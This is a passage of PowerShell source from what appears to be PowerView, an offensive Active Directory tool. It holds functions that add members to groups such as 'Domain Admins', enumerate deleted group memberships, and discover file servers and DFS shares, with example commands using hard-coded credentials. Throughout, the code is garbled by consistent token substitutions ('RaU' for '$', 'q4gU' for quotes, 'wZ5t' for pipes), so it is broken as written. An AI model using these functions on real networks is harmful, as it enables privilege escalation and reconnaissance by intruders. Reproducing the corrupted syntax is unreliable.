        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    BEGIN {
        RaUSearcherArguments = @{
            q4gUPropertiesq4gU    =   q4gUmsds-replvaluemetadataq4gU,q4gUdistinguishednameq4gU
            q4gURawq4gU           =   RaUTrue
            q4gULDAPFilterq4gU    =   q4gU(objectCategory=group)q4gU
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUIdentityq4gU]) { RaUSearcherArguments[q4gUIdentityq4gU] = RaUIdentity }

        Get-DomainObject @SearcherArguments wZ5t ForEach-Object {
            RaUObjectDN = RaU_.Properties[q4gUdistinguishednameq4gU][0]
            ForEach(RaUXMLNode in RaU_.Properties[q4gUmsds-replvaluemetadataq4gU]) {
                RaUTempObject = [xml]RaUXMLNode wZ5t Select-Object -ExpandProperty q4gUDS_REPL_VALUE_META_DATAq4gU -ErrorAction SilentlyContinue
                if (RaUTempObject) {
                    if ((RaUTempObject.pszAttributeName -Match q4gUmemberq4gU) -and ((RaUTempObject.dwVersion % 2) -eq 0 )) {
                        RaUOutput = New-Object PSObject
                        RaUOutput wZ5t Add-Member NoteProperty q4gUGroupDNq4gU RaUObjectDN
                        RaUOutput wZ5t Add-Member NoteProperty q4gUMemberDNq4gU RaUTempObject.pszObjectDn
                        RaUOutput wZ5t Add-Member NoteProperty q4gUTimeFirstAddedq4gU RaUTempObject.ftimeCreated
                        RaUOutput wZ5t Add-Member NoteProperty q4gUTimeDeletedq4gU RaUTempObject.ftimeDeleted
                        RaUOutput wZ5t Add-Member NoteProperty q4gULastOriginatingChangeq4gU RaUTempObject.ftimeLastOriginatingChange
                        RaUOutput wZ5t Add-Member NoteProperty q4gUTimesAddedq4gU (RaUTempObject.dwVersion / 2)
                        RaUOutput wZ5t Add-Member NoteProperty q4gULastOriginatingDsaDNq4gU RaUTempObject.pszLastOriginatingDsaDN
                        RaUOutput.PSObject.TypeNames.Insert(0, q4gUPowerView.DomainGroupMemberDeletedq4gU)
                        RaUOutput
                    }
                }
                else {
                    Write-Verbose Oj8X[Get-DomainGroupMemberDeleted] Error retrieving q4gUmsds-replvaluemetadataq4gU for q4gURaUObjectDNq4gUOj8X
                }
            }
        }
    }
}


function Add-DomainGroupMember {
<#
.SYNOPSIS

Adds a domain user (or group) to an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and added
to the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to add members to.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Add-DomainGroupMember -Identity q4gUDomain Adminsq4gU -Members q4gUharmj0yq4gU

Adds harmj0y to q4gUDomain Adminsq4gU in the current domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Add-DomainGroupMember -Identity q4gUDomain Adminsq4gU -Members q4gUharmj0yq4gU -Credential RaUCred

Adds harmj0y to q4gUDomain Adminsq4gU in the current domain using the alternate credentials.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
RaUUserPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword RaUUserPassword -Credential RaUCred wZ5t Add-DomainGroupMember q4gUDomain Adminsq4gU -Credential RaUCred

Creates the q4gUandyq4gU user with the specified description and password, using the specified
alternate credentials, and adds the user to q4gUdomain adminsq4gU using Add-DomainGroupMember
and the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue)]
        [Alias(q4gUGroupNameq4gU, q4gUGroupIdentityq4gU)]
        [String]
        RaUIdentity,

        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUMemberIdentityq4gU, q4gUMemberq4gU, q4gUDistinguishedNameq4gU)]
        [String[]]
        RaUMembers,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUContextArguments = @{
            q4gUIdentityq4gU = RaUIdentity
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUContextArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUContextArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUGroupContext = Get-PrincipalContext @ContextArguments

        if (RaUGroupContext) {
            try {
                RaUGroup = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(RaUGroupContext.Context, RaUGroupContext.Identity)
            }
            catch {
                Write-Warning Oj8X[Add-DomainGroupMember] Error finding the group identity q4gURaUIdentityq4gU : RaU_Oj8X
            }
        }
    }

    PROCESS {
        if (RaUGroup) {
            ForEach (RaUMember in RaUMembers) {
                if (RaUMember -match q4gU.+ScKjScKj.+q4gU) {
                    RaUContextArguments[q4gUIdentityq4gU] = RaUMember
                    RaUUserContext = Get-PrincipalContext @ContextArguments
                    if (RaUUserContext) {
                        RaUUserIdentity = RaUUserContext.Identity
                    }
                }
                else {
                    RaUUserContext = RaUGroupContext
                    RaUUserIdentity = RaUMember
                }
                Write-Verbose Oj8X[Add-DomainGroupMember] Adding member q4gURaUMemberq4gU to group q4gURaUIdentityq4gUOj8X
                RaUMember = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(RaUUserContext.Context, RaUUserIdentity)
                RaUGroup.Members.Add(RaUMember)
                RaUGroup.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {
<#
.SYNOPSIS

Removes a domain user (or group) from an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and removed
from the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to remove members from.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Remove-DomainGroupMember -Identity q4gUDomain Adminsq4gU -Members q4gUharmj0yq4gU

Removes harmj0y from q4gUDomain Adminsq4gU in the current domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Remove-DomainGroupMember -Identity q4gUDomain Adminsq4gU -Members q4gUharmj0yq4gU -Credential RaUCred

Removes harmj0y from q4gUDomain Adminsq4gU in the current domain using the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue)]
        [Alias(q4gUGroupNameq4gU, q4gUGroupIdentityq4gU)]
        [String]
        RaUIdentity,

        [Parameter(Mandatory = RaUTrue, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUMemberIdentityq4gU, q4gUMemberq4gU, q4gUDistinguishedNameq4gU)]
        [String[]]
        RaUMembers,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUContextArguments = @{
            q4gUIdentityq4gU = RaUIdentity
        }
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUContextArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUContextArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUGroupContext = Get-PrincipalContext @ContextArguments

        if (RaUGroupContext) {
            try {
                RaUGroup = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(RaUGroupContext.Context, RaUGroupContext.Identity)
            }
            catch {
                Write-Warning Oj8X[Remove-DomainGroupMember] Error finding the group identity q4gURaUIdentityq4gU : RaU_Oj8X
            }
        }
    }

    PROCESS {
        if (RaUGroup) {
            ForEach (RaUMember in RaUMembers) {
                if (RaUMember -match q4gU.+ScKjScKj.+q4gU) {
                    RaUContextArguments[q4gUIdentityq4gU] = RaUMember
                    RaUUserContext = Get-PrincipalContext @ContextArguments
                    if (RaUUserContext) {
                        RaUUserIdentity = RaUUserContext.Identity
                    }
                }
                else {
                    RaUUserContext = RaUGroupContext
                    RaUUserIdentity = RaUMember
                }
                Write-Verbose Oj8X[Remove-DomainGroupMember] Removing member q4gURaUMemberq4gU from group q4gURaUIdentityq4gUOj8X
                RaUMember = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(RaUUserContext.Context, RaUUserIdentity)
                RaUGroup.Members.Remove(RaUMember)
                RaUGroup.Save()
            }
        }
    }
}


function Get-DomainFileServer {
<#
.SYNOPSIS

Returns a list of servers likely functioning as file servers.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

Returns a list of likely fileservers by searching for all users in Active Directory
with non-null homedirectory, scriptpath, or profilepath fields, and extracting/uniquifying
the server names.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainFileServer

Returns active file servers for the current domain.

.EXAMPLE

Get-DomainFileServer -Domain testing.local

Returns active file servers for the q4gUtesting.localq4gU domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainFileServer -Credential RaUCred

.OUTPUTS

String

One or more strings representing file server names.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainNameq4gU, q4gUNameq4gU)]
        [String[]]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            # short internal helper to split UNC server paths
            Param([String]RaUPath)

            if (RaUPath -and (RaUPath.split(q4gUScKjScKjq4gU).Count -ge 3)) {
                RaUTemp = RaUPath.split(q4gUScKjScKjq4gU)[2]
                if (RaUTemp -and (RaUTemp -ne q4gUq4gU)) {
                    RaUTemp
                }
            }
        }

        RaUSearcherArguments = @{
            q4gULDAPFilterq4gU = q4gU(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(wZ5t(homedirectory=*)(scriptpath=*)(profilepath=*)))q4gU
            q4gUPropertiesq4gU = q4gUhomedirectory,scriptpath,profilepathq4gU
        }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUDomainq4gU]) {
            ForEach (RaUTargetDomain in RaUDomain) {
                RaUSearcherArguments[q4gUDomainq4gU] = RaUTargetDomain
                RaUUserSearcher = Get-DomainSearcher @SearcherArguments
                # get all results w/o the pipeline and uniquify them (I know itq4gUs not pretty)
                RaU(ForEach(RaUUserResult in RaUUserSearcher.FindAll()) {if (RaUUserResult.Properties[q4gUhomedirectoryq4gU]) {Split-Path(RaUUserResult.Properties[q4gUhomedirectoryq4gU])}if (RaUUserResult.Properties[q4gUscriptpathq4gU]) {Split-Path(RaUUserResult.Properties[q4gUscriptpathq4gU])}if (RaUUserResult.Properties[q4gUprofilepathq4gU]) {Split-Path(RaUUserResult.Properties[q4gUprofilepathq4gU])}}) wZ5t Sort-Object -Unique
            }
        }
        else {
            RaUUserSearcher = Get-DomainSearcher @SearcherArguments
            RaU(ForEach(RaUUserResult in RaUUserSearcher.FindAll()) {if (RaUUserResult.Properties[q4gUhomedirectoryq4gU]) {Split-Path(RaUUserResult.Properties[q4gUhomedirectoryq4gU])}if (RaUUserResult.Properties[q4gUscriptpathq4gU]) {Split-Path(RaUUserResult.Properties[q4gUscriptpathq4gU])}if (RaUUserResult.Properties[q4gUprofilepathq4gU]) {Split-Path(RaUUserResult.Properties[q4gUprofilepathq4gU])}}) wZ5t Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {
<#
.SYNOPSIS

Returns a list of all fault-tolerant distributed file systems
for the current (or specified) domains.

Author: Ben Campbell (@meatballs__)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

This function searches for all distributed file systems (either version
1, 2, or both depending on -Version X) by searching for domain objects
matching (objectClass=fTDfs) or (objectClass=msDFS-Linkv2), respectively
The server data is parsed appropriately and returned.

.PARAMETER Domain

Specifies the domains to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDFSShare

Returns all distributed file system shares for the current domain.

.EXAMPLE

Get-DomainDFSShare -Domain testlab.local

Returns all distributed file system shares for the q4gUtestlab.localq4gU domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainDFSShare -Credential RaUCred

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject describing the distributed file systems.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseApprovedVerbsq4gU, q4gUq4gU)]
    [OutputType(q4gUSystem.Management.Automation.PSCustomObjectq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainNameq4gU, q4gUNameq4gU)]
        [String[]]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(q4gUAllq4gU, q4gUV1q4gU, q4gU1q4gU, q4gUV2q4gU, q4gU2q4gU)]
        [String]
        RaUVersion = q4gUAllq4gU
    )

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                RaUPkt
            )

            RaUbin = RaUPkt
            RaUblob_version = [bitconverter]::ToUInt32(RaUbin[0..3],0)
            RaUblob_element_count = [bitconverter]::ToUInt32(RaUbin[4..7],0)
            RaUoffset = 8
            #https://msdn.microsoft.com/en-us/library/cc227147.aspx
            RaUobject_list = @()
            for(RaUi=1; RaUi -le RaUblob_element_count; RaUi++){
                RaUblob_name_size_start = RaUoffset
                RaUblob_name_size_end = RaUoffset + 1
                RaUblob_name_size = [bitconverter]::ToUInt16(RaUbin[RaUblob_name_size_start..RaUblob_name_size_end],0)

                RaUblob_name_start = RaUblob_name_size_end + 1
                RaUblob_name_end = RaUblob_name_start + RaUblob_name_size - 1
                RaUblob_name = [System.Text.Encoding]::Unicode.GetString(RaUbin[RaUblob_name_start..RaUblob_name_end])

                RaUblob_data_size_start = RaUblob_name_end + 1
                RaUblob_data_size_end = RaUblob_data_size_start + 3
                RaUblob_data_size = [bitconverter]::ToUInt32(RaUbin[RaUblob_data_size_start..RaUblob_data_size_end],0)

                RaUblob_data_start = RaUblob_data_size_end + 1
                RaUblob_data_end = RaUblob_data_start + RaUblob_data_size - 1
                RaUblob_data = RaUbin[RaUblob_data_start..RaUblob_data_end]
                switch -wildcard (RaUblob_name) {
                    Oj8XScKjsiterootOj8X {  }
                    Oj8XScKjdomainroot*Oj8X {
                        # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...
                        # DFSRootOrLinkIDBlob
                        RaUroot_or_link_guid_start = 0
                        RaUroot_or_link_guid_end = 15
                        RaUroot_or_link_guid = [byte[]]RaUblob_data[RaUroot_or_link_guid_start..RaUroot_or_link_guid_end]
                        RaUguid = New-Object Guid(,RaUroot_or_link_guid) # should match RaUguid_str
                        RaUprefix_size_start = RaUroot_or_link_guid_end + 1
                        RaUprefix_size_end = RaUprefix_size_start + 1
                        RaUprefix_size = [bitconverter]::ToUInt16(RaUblob_data[RaUprefix_size_start..RaUprefix_size_end],0)
                        RaUprefix_start = RaUprefix_size_end + 1
                        RaUprefix_end = RaUprefix_start + RaUprefix_size - 1
                        RaUprefix = [System.Text.Encoding]::Unicode.GetString(RaUblob_data[RaUprefix_start..RaUprefix_end])

                        RaUshort_prefix_size_start = RaUprefix_end + 1
                        RaUshort_prefix_size_end = RaUshort_prefix_size_start + 1
                        RaUshort_prefix_size = [bitconverter]::ToUInt16(RaUblob_data[RaUshort_prefix_size_start..RaUshort_prefix_size_end],0)
                        RaUshort_prefix_start = RaUshort_prefix_size_end + 1
                        RaUshort_prefix_end = RaUshort_prefix_start + RaUshort_prefix_size - 1
                        RaUshort_prefix = [System.Text.Encoding]::Unicode.GetString(RaUblob_data[RaUshort_prefix_start..RaUshort_prefix_end])

                        RaUtype_start = RaUshort_prefix_end + 1
                        RaUtype_end = RaUtype_start + 3
                        RaUtype = [bitconverter]::ToUInt32(RaUblob_data[RaUtype_start..RaUtype_end],0)

                        RaUstate_start = RaUtype_end + 1
                        RaUstate_end = RaUstate_start + 3
                        RaUstate = [bitconverter]::ToUInt32(RaUblob_data[RaUstate_start..RaUstate_end],0)

                        RaUcomment_size_start = RaUstate_end + 1
                        RaUcomment_size_end = RaUcomment_size_start + 1
                        RaUcomment_size = [bitconverter]::ToUInt16(RaUblob_data[RaUcomment_size_start..RaUcomment_size_end],0)
                        RaUcomment_start = RaUcomment_size_end + 1
                        RaUcomment_end = RaUcomment_start + RaUcomment_size - 1
                        if (RaUcomment_size -gt 0)  {
                            RaUcomment = [System.Text.Encoding]::Unicode.GetString(RaUblob_data[RaUcomment_start..RaUcomment_end])
                        }
                        RaUprefix_timestamp_start = RaUcomment_end + 1
                        RaUprefix_timestamp_end = RaUprefix_timestamp_start + 7
                        # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME
                        RaUprefix_timestamp = RaUblob_data[RaUprefix_timestamp_start..RaUprefix_timestamp_end] #dword lowDateTime #dword highdatetime
                        RaUstate_timestamp_start = RaUprefix_timestamp_end + 1
                        RaUstate_timestamp_end = RaUstate_timestamp_start + 7
                        RaUstate_timestamp = RaUblob_data[RaUstate_timestamp_start..RaUstate_timestamp_end]
                        RaUcomment_timestamp_start = RaUstate_timestamp_end + 1
                        RaUcomment_timestamp_end = RaUcomment_timestamp_start + 7
                        RaUcomment_timestamp = RaUblob_data[RaUcomment_timestamp_start..RaUcomment_timestamp_end]
                        RaUversion_start = RaUcomment_timestamp_end  + 1
                        RaUversion_end = RaUversion_start + 3
                        RaUversion = [bitconverter]::ToUInt32(RaUblob_data[RaUversion_start..RaUversion_end],0)

                        # Parse rest of DFSNamespaceRootOrLinkBlob here
                        RaUdfs_targetlist_blob_size_start = RaUversion_end + 1
                        RaUdfs_targetlist_blob_size_end = RaUdfs_targetlist_blob_size_start + 3
                        RaUdfs_targetlist_blob_size = [bitconverter]::ToUInt32(RaUblob_data[RaUdfs_targetlist_blob_size_start..RaUdfs_targetlist_blob_size_end],0)

                        RaUdfs_targetlist_blob_start = RaUdfs_targetlist_blob_size_end + 1
                        RaUdfs_targetlist_blob_end = RaUdfs_targetlist_blob_start + RaUdfs_targetlist_blob_size - 1
                        RaUdfs_targetlist_blob = RaUblob_data[RaUdfs_targetlist_blob_start..RaUdfs_targetlist_blob_end]
                        RaUreserved_blob_size_start = RaUdfs_targetlist_blob_end + 1
                        RaUreserved_blob_size_end = RaUreserved_blob_size_start + 3
                        RaUreserved_blob_size = [bitconverter]::ToUInt32(RaUblob_data[RaUreserved_blob_size_start..RaUreserved_blob_size_end],0)

                        RaUreserved_blob_start = RaUreserved_blob_size_end + 1
                        RaUreserved_blob_end = RaUreserved_blob_start + RaUreserved_blob_size - 1
                        RaUreserved_blob = RaUblob_data[RaUreserved_blob_start..RaUreserved_blob_end]
                        RaUreferral_ttl_start = RaUreserved_blob_end + 1
                        RaUreferral_ttl_end = RaUreferral_ttl_start + 3
                        RaUreferral_ttl = [bitconverter]::ToUInt32(RaUblob_data[RaUreferral_ttl_start..RaUreferral_ttl_end],0)

                        #Parse DFSTargetListBlob
                        RaUtarget_count_start = 0
                        RaUtarget_count_end = RaUtarget_count_start + 3
                        RaUtarget_count = [bitconverter]::ToUInt32(RaUdfs_targetlist_blob[RaUtarget_count_start..RaUtarget_count_end],0)
                        RaUt_offset = RaUtarget_count_end + 1

                        for(RaUj=1; RaUj -le RaUtarget_count; RaUj++){
                            RaUtarget_entry_size_start = RaUt_offset
                            RaUtarget_entry_size_end = RaUtarget_entry_size_start + 3
